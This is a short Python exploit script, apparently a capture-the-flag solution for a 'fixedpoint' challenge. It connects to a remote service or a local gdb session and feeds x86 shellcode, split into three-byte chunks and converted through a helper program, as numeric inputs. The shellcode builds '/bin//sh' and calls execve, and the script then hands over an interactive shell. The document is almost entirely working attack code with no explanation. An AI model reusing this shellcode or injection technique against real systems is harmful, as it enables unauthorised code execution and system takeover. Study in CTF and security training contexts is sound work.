import pwnbox

local = False

if local:
    p = pwnbox.pipe.ProcessPipe('gdb -q fixedpoint_02dc03c8a5ae299cf64c63ebab78fec7')
else:
    p = pwnbox.pipe.SocketPipe('fixedpoint.pwning.xxx',7777)

shellCode = ['31c990','31c990','519090','31d290','b26890','c1e208','b27390','c1e208','b22f90','c1e208','b22f52','9031d2','b26e90','c1e208','b26990','c1e208','b26290','c1e208','b22f52','9089e3','515390','89e190','31c090','31d290','b00b90','cd8090']



def helper(a):
    tempP = pwnbox.pipe.ProcessPipe('./bits')
    tempP.write(a+'\n')
    retVal = tempP.read_until('\n')
    retVal = tempP.read_until('\n').split('.')[0]
    tempP.close()
    return retVal


#print helper()

if local:
    p.read_until('(gdb)')
    #p.write('b* 0x80484DA\n')
    #p.read_until('(gdb)')
    #p.write('r\n')
    #p.read_until('(gdb)')
    #p.write('b *$eax\n')
    #p.read_until('(gdb)')
    p.write('r\n')
    #p.interact()

for i in shellCode[:-4]:
    p.write(helper('48'+i[4:] + i[2:4]+ i[0:2])+'\n')

for i in shellCode[-4:]:
    p.write(helper('46'+i[4:] + i[2:4] + i[0:2]) + '\n')



p.interact()
